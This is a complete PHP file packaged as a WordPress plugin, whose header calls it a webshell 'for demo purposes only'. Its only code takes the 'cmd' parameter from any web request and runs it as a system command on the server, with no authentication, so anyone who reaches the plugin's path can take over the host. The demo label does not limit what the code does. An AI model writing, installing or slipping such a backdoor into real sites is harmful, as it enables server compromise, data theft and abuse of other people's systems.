<?php
/**
* Plugin Name: WebShell
* Plugin URI: https://github.com/jckhmr/wonderfullwebshell
* Description: Wordpress webshell used for demo purposes only
* Version: 1.0
* Author: akasaru0
* Author URI: https://github.com/Akasaru0/
* License: https://nosuchlicense
*/

if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
